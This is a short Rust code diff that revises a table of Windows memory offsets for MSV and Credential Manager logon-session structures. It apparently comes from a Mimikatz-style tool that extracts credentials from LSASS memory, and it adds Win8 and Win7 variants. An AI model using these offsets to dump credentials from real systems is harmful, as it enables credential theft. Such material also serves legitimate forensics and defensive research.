@@ -16,13 +16,14 @@ struct CredmanMsvOffsets {
 }
 
 const CREDMAN_MSV_OFFSET_VARIANTS: &[CredmanMsvOffsets] = &[
-    // Variant 0: Win10 1607+ (build 14393+) / 22H2 (build 19045)
-    // MSV variant 2: luid=0x90, username=0xA8, credentials_ptr=0x108
-    // CredentialManager follows immediately at 0x110
+    // Win10 1607+ / Win11 (build 14393+)
     CredmanMsvOffsets { flink: 0x00, luid: 0x90, username: 0xA8, credman_ptr: 0x110 },
-    // Variant 1: Older Win10 (1507-1511)
-    // MSV variant 1: luid=0x70, username=0x80, credentials_ptr=0xE8
+    // Win10 1507-1511
     CredmanMsvOffsets { flink: 0x00, luid: 0x70, username: 0x80, credman_ptr: 0xF0 },
+    // Win8/8.1
+    CredmanMsvOffsets { flink: 0x00, luid: 0x60, username: 0x70, credman_ptr: 0xE0 },
+    // Win7 SP1
+    CredmanMsvOffsets { flink: 0x00, luid: 0x30, username: 0x40, credman_ptr: 0xC0 },
 ];
 
 /// KIWI_CREDMAN_LIST_STARTER offsets (Win10 19041+):
